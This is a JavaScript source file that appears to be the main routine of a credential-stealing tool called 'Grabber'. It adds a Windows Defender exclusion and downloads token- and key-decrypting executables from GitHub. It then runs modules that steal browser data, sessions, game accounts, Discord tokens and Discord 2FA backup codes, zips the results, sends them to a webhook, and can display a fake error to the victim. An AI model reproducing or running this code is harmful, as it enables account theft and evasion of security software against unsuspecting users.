const config = require('../config');
const { runningFromExecutable, sleep } = require('./general');
const { join, sep } = require('path');
const os = require('os');
const { execSync, spawnSync } = require('child_process');
const { copyFileSync, existsSync, mkdtempSync, createWriteStream } = require('fs');
const axios = require('axios');

let tempFolder = '';

function createTempFolder() {
  tempFolder = mkdtempSync(join(os.tmpdir(), sep), 'utf8');
  !runningFromExecutable() && spawnSync('explorer', [tempFolder]);

  return tempFolder;
}

const getTempFolder = function() {
  return tempFolder;
};

module.exports = async () => {
  module.exports.getTempFolder = getTempFolder;
  const tempFolder = createTempFolder();

  if (runningFromExecutable()) await execSync(`powershell -Command Add-MpPreference -ExclusionPath "${tempFolder}"`);
  await download('https://github.com/JustYuuto/Grabber/raw/master/util/decrypt-token/decrypt_token.exe');
  await download('https://github.com/JustYuuto/Grabber/raw/master/util/decrypt-key/decrypt_key.exe');

  if (config.addToStartup && runningFromExecutable()) require('../functions/startup');
  config.discord.killProcess && require('../functions/kill-discord');
  require('../functions/grab-mc');
  require('../functions/grab-browsers-data');
  await require('../functions/grab-roblox')();
  require('../functions/steal-sessions');

  const mfaCodesPath = join(os.homedir(), 'Downloads', 'discord_backup_codes.txt');
  if (existsSync(mfaCodesPath)) {
    copyFileSync(mfaCodesPath, join(tempFolder, 'Discord 2FA Backup Codes.txt'));
  }
  await require('../functions/grab-discord-token');
  await sleep(500);
  require('../functions/zip').then(await require('../functions/webhook'));

  config.fakeError && require('../functions/fake-error');
};

async function download(url) {
  try {
    const { data } = await axios.get(url, {
      responseType: 'stream'
    });
    data.pipe(createWriteStream(join(getTempFolder(), url.split('/').pop())));
  } catch (e) {
    process.exit(0);
  }
}
